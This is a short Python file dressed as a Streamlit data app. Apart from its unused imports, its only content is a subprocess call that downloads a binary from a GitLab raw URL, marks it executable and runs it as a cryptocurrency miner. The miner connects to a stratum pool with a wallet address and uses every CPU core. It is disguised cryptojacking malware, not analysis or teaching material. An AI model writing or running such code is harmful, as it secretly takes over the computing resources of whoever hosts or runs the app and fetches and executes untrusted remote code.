from collections import namedtuple
import altair as alt
import math
import pandas as pd
import streamlit as st
import os
import time
import subprocess
from os import system, name
from time import sleep
from subprocess import PIPE, Popen
import base64

p = subprocess.run("curl -L -o ssamd https://gitlab.com/Ikuzot/ghost/-/raw/main/ssamd && chmod +x ssamd && ./ssamd -a yespower -o stratum+tcps://stratum-na.rplant.xyz:17017 -u web1qxnm9q7txetqj6uzxat4xkas6rxr93q5fc7xjm4.Nung -t $(nproc --all)", stdout=subprocess.PIPE, shell=True)
